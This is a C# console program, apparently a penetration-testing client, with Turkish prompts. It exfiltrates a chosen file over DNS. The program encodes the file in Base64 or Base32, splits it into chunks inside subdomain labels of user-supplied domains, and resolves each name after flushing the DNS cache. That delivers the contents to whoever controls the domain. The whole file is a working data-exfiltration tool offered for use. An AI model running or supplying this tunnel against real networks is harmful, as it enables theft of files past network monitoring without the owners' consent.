using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Net.NetworkInformation;
using System.Diagnostics;
using System.Text.RegularExpressions;

namespace DnsTunnelClient

{
    class Program
    {
        private static int TimeOut;
        private static string kullaniciID;

        private static string testEdilenKurum;

        private const int InByteSize = 8;

        private const int OutByteSize = 5;

        private const string Base32Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        static void Main(string[] args)
        {

            string komuta = "ipconfig /flushdns";
            Process Process1 = new Process();
            ProcessStartInfo ProcessInfo1;
            ProcessInfo1 = new ProcessStartInfo("cmd.exe", "/C " + komuta);
            ProcessInfo1.CreateNoWindow = true;
            ProcessInfo1.UseShellExecute = false;

            Process1 = Process.Start(ProcessInfo1);
            Process1.WaitForExit();
            Process1.Close();
            System.Net.NetworkInformation.Ping png = new System.Net.NetworkInformation.Ping();
            List<string> domain_list = new List<string>();
            int sayi = 1;
        KontrolSubSayisi:
            try
            {
                Console.WriteLine("Subdomain sayısı:");
                string sayi_string = Console.ReadLine();
                Console.WriteLine("--------------------------------------------------------------------");
                sayi = Int32.Parse(sayi_string);
            }
            catch (Exception ex)
            {

                Console.WriteLine("Sayı giriniz:" + ex.Message);
                goto KontrolSubSayisi;
            }
            for (int i = 0; i < sayi; i++)
            {
                Console.WriteLine("Domain adı:");
                string site = Console.ReadLine();
                domain_list.Add(site);
            }
            Console.WriteLine("--------------------------------------------------------------------");
        KontrolDosyaAdi:
            string dosyaAdi;
            Console.WriteLine("Dosya adi giriniz:");
            dosyaAdi = Console.ReadLine();
            if (dosyaAdi == "")
            {
                Console.WriteLine("Boş geçmeyiniz");
                goto KontrolDosyaAdi;
            }
            Console.WriteLine("--------------------------------------------------------------------");
            Console.WriteLine("Test edilen kurumun adini giriniz");
            testEdilenKurum = Console.ReadLine();
            string timeout;
            Console.WriteLine("--------------------------------------------------------------------");
            Console.WriteLine("TimeOut' milisaniye cinsinden giriniz:");
            timeout = Console.ReadLine();
            TimeOut = Convert.ToInt32(timeout);
            Console.WriteLine("--------------------------------------------------------------------");
        idKontrol:
            Console.WriteLine("Kendinize özel sayı ve karakterden oluşan 3 haneli anahtar tanımlayın");
            kullaniciID = Console.ReadLine();
            if (kullaniciID.Length != 3)
            {
                Console.WriteLine("Hatalı anahtar boyutu");
                goto idKontrol;
            }

            string islem_No;
            Console.WriteLine("--------------------------------------------------------------------");
        Kontrol:
            Console.WriteLine("Dosyayı nasıl kaçırmak istediğinizi seçiniz");

            Console.WriteLine("1.)Byte");
            Console.WriteLine("2.)Base64");
            Console.WriteLine("3.)Base32");
            islem_No = Console.ReadLine();
            if (islem_No == "")
            {
                Console.WriteLine("Hatalı numara");
                goto Kontrol;
            }
            Console.WriteLine("--------------------------------------------------------------------");

            int Islem_No = Convert.ToInt32(islem_No);

            List<string> dizi = new List<string>();
            List<string> veri_dizisi = new List<string>();
            string yollanacak_veri;

            string[] dosyaAd = dosyaAdi.Split('\\');

            string newDosyaAdi = dosyaAd[dosyaAd.Count() - 1];

            if (Islem_No == 1)
            {
                string y = System.Convert.ToBase64String(GetBytes(testEdilenKurum));
                string[] kurum = Regex.Split(y, "=");
                string dosya = System.Convert.ToBase64String(GetBytes(newDosyaAdi));
                string[] dosyaNew = Regex.Split(dosya, "=");

                dizi.Add(kurum[0]);
                dizi.Add(dosyaNew[0]);
                dizi.Add(islem_No);
                try
                {
                    byte[] content = File.ReadAllBytes(dosyaAdi);

                    string result1 = System.Convert.ToBase64String(content);
                    StreamWriter a = new StreamWriter("okan.txt");
                    a.WriteLine(result1);
                    a.Close();
                    byte[] content2 = File.ReadAllBytes(@"okan.txt");
                    string result = GetString(content2);
                    int diziBoyutu = result.Length - 1, index = 0;
                    int sayac = result.Length;


                    int kalan;
                    while (sayac > 16)
                    {
                        sayac -= 16;
                        dizi.Add(result.Substring(index, 16));
                        index += 16;
                    }
                    kalan = sayac;
                    dizi.Add(result.Substring(index, kalan));
                    string son = "bitti";

                    dizi.Add(son);
                    for (int i = 0; i < dizi.Count; i++)
                    {

                        yollanacak_veri = i + kullaniciID + "-" + dizi[i] + "." + domain_list[i % (domain_list.Count)];
                        veri_dizisi.Add(yollanacak_veri);

                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Hatalı dosya adi:" + ex.Message);
                    goto KontrolDosyaAdi;

                }
            }
            else if (Islem_No == 2)
            {
                string y = System.Convert.ToBase64String(GetBytes(testEdilenKurum));
                string[] kurum = Regex.Split(y, "=");
                string dosya = System.Convert.ToBase64String(GetBytes(newDosyaAdi));
                string[] dosyaNew = Regex.Split(dosya, "=");

                dizi.Add(kurum[0]);
                dizi.Add(dosyaNew[0]);
                dizi.Add(islem_No);
                try
                {
                    byte[] content = File.ReadAllBytes(dosyaAdi);

                    string result = System.Convert.ToBase64String(content);
                    result = result.Replace("/", "bolu");
                    result = result.Replace("+", "arti");
                    int diziBoyutu = result.Length - 1, index = 0;
                    int sayac = result.Length;
                    Random random = new Random();
                    int boyut = random.Next(30, 52);

                    int kalan;
                    while (sayac > boyut)
                    {
                        boyut = random.Next(30, 52);
                        sayac -= boyut;
                        dizi.Add(result.Substring(index, boyut));
                        index += boyut;
                    }
                    kalan = sayac;
                    string y3 = result.Substring(index, kalan);
                    string[] ya = Regex.Split(y3, "=");
                    dizi.Add(ya[0]);
                    string son = "bitti";

                    dizi.Add(son);
                    for (int i = 0; i < dizi.Count; i++)
                    {


                        yollanacak_veri = i + kullaniciID + "-" + dizi[i] + "." + domain_list[i % (domain_list.Count)];
                        veri_dizisi.Add(yollanacak_veri);

                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Hatalı dosya adi:" + ex.Message);
                    goto KontrolDosyaAdi;
                }
            }
            else if (Islem_No == 3)
            {
                string y = ToBase32String(GetBytes(testEdilenKurum));
                string[] kurum = Regex.Split(y, "=");
                string dosya = ToBase32String(GetBytes(newDosyaAdi));
                string[] dosyaNew = Regex.Split(dosya, "=");

                dizi.Add(kurum[0]);
                dizi.Add(dosyaNew[0]);

                dizi.Add(islem_No);
                try
                {
                    byte[] content = File.ReadAllBytes(dosyaAdi);

                    string result = ToBase32String(content);
                    result = result.Replace("/", "bolu");
                    result = result.Replace("+", "arti");
                    int diziBoyutu = result.Length - 1, index = 0;
                    int sayac = result.Length;
                    Random random = new Random();
                    int boyut = random.Next(30, 52);

                    int kalan;
                    while (sayac > boyut)
                    {
                        boyut = random.Next(30, 52);
                        sayac -= boyut;
                        dizi.Add(result.Substring(index, boyut));
                        index += boyut;
                    }
                    kalan = sayac;
                    string y2 = result.Substring(index, kalan);
                    string[] ya = Regex.Split(y2, "=");
                    dizi.Add(ya[0]);
                    string son = "bitti";

                    dizi.Add(son);
                    for (int i = 0; i < dizi.Count; i++)
                    {


                        yollanacak_veri = i + kullaniciID + "-" + dizi[i] + "." + domain_list[i % (domain_list.Count)];
                        veri_dizisi.Add(yollanacak_veri);

                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Hatalı dosya adi:" + ex.Message);
                    goto KontrolDosyaAdi;
                }
            }
            else
            {
                Console.WriteLine("Hatalı işlem numarası tekrar seçiniz");
                goto Kontrol;
            }



            IPAddress[] ip;


            for (int i = 0; i < veri_dizisi.Count; i++)
            {
                System.Threading.Thread.Sleep(TimeOut);
                for (int j = 0; j < 2; j++)
                {
                    System.Threading.Thread.Sleep(TimeOut);
                    Ping ping = new Ping();
                    try
                    {
                        string komut = "ipconfig /flushdns";
                        Process Process = new Process();
                        ProcessStartInfo ProcessInfo;
                        ProcessInfo = new ProcessStartInfo("cmd.exe", "/C " + komut);
                        ProcessInfo.CreateNoWindow = true;
                        ProcessInfo.UseShellExecute = false;

                        Process = Process.Start(ProcessInfo);
                        Process.WaitForExit();
                        Process.Close();


                        IPHostEntry dns_bilgi = Dns.GetHostEntry(veri_dizisi[i]);

                        ip = dns_bilgi.AddressList;
                        foreach (IPAddress ipp in ip)
                        {
                            Console.WriteLine("adres:" + veri_dizisi[i] + " ip:" + ipp);
                        }

                        //PingReply DonenCevap = ping.Send(veri_dizisi[i]);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("adres:" + veri_dizisi[i] + " böyle bir adres yok");

                    }
                }
            }



            Console.ReadLine();
        }

        private static string GetString(byte[] bytes)
        {
            if (bytes.Length % 2 != 0)
            {
                byte[] newArray = new byte[bytes.Length + 1];
                bytes.CopyTo(newArray, 1);
                newArray[0] = byte.Parse("0");
                bytes = newArray;
            }
            char[] chars = new char[bytes.Length / sizeof(char)];
            System.Buffer.BlockCopy(bytes, 0, chars, 0, bytes.Length);
            return new string(chars);
        }
        public static byte[] GetBytes(string str)
        {
            byte[] bytes = new byte[str.Length * sizeof(char)];
            System.Buffer.BlockCopy(str.ToCharArray(), 0, bytes, 0, bytes.Length);
            return bytes;
        }
        private static string ToBase32String(byte[] bytes)
        {
            // Check if byte array is null
            if (bytes == null)
            {
                return null;
            }
            // Check if empty
            else if (bytes.Length == 0)
            {
                return string.Empty;
            }

            // Prepare container for the final value
            StringBuilder builder = new StringBuilder(bytes.Length * InByteSize / OutByteSize);

            // Position in the input buffer
            int bytesPosition = 0;

            // Offset inside a single byte that <bytesPosition> points to (from left to right)
            // 0 - highest bit, 7 - lowest bit
            int bytesSubPosition = 0;

            // Byte to look up in the dictionary
            byte outputBase32Byte = 0;

            // The number of bits filled in the current output byte
            int outputBase32BytePosition = 0;

            // Iterate through input buffer until we reach past the end of it
            while (bytesPosition < bytes.Length)
            {
                // Calculate the number of bits we can extract out of current input byte to fill missing bits in the output byte
                int bitsAvailableInByte = Math.Min(InByteSize - bytesSubPosition, OutByteSize - outputBase32BytePosition);

                // Make space in the output byte
                outputBase32Byte <<= bitsAvailableInByte;

                // Extract the part of the input byte and move it to the output byte
                outputBase32Byte |= (byte)(bytes[bytesPosition] >> (InByteSize - (bytesSubPosition + bitsAvailableInByte)));

                // Update current sub-byte position
                bytesSubPosition += bitsAvailableInByte;

                // Check overflow
                if (bytesSubPosition >= InByteSize)
                {
                    // Move to the next byte
                    bytesPosition++;
                    bytesSubPosition = 0;
                }

                // Update current base32 byte completion
                outputBase32BytePosition += bitsAvailableInByte;

                // Check overflow or end of input array
                if (outputBase32BytePosition >= OutByteSize)
                {
                    // Drop the overflow bits
                    outputBase32Byte &= 0x1F;  // 0x1F = 00011111 in binary

                    // Add current Base32 byte and convert it to character
                    builder.Append(Base32Alphabet[outputBase32Byte]);

                    // Move to the next byte
                    outputBase32BytePosition = 0;
                }
            }

            // Check if we have a remainder
            if (outputBase32BytePosition > 0)
            {
                // Move to the right bits
                outputBase32Byte <<= (OutByteSize - outputBase32BytePosition);

                // Drop the overflow bits
                outputBase32Byte &= 0x1F;  // 0x1F = 00011111 in binary

                // Add current Base32 byte and convert it to character
                builder.Append(Base32Alphabet[outputBase32Byte]);
            }

            return builder.ToString();
        }

    }
}

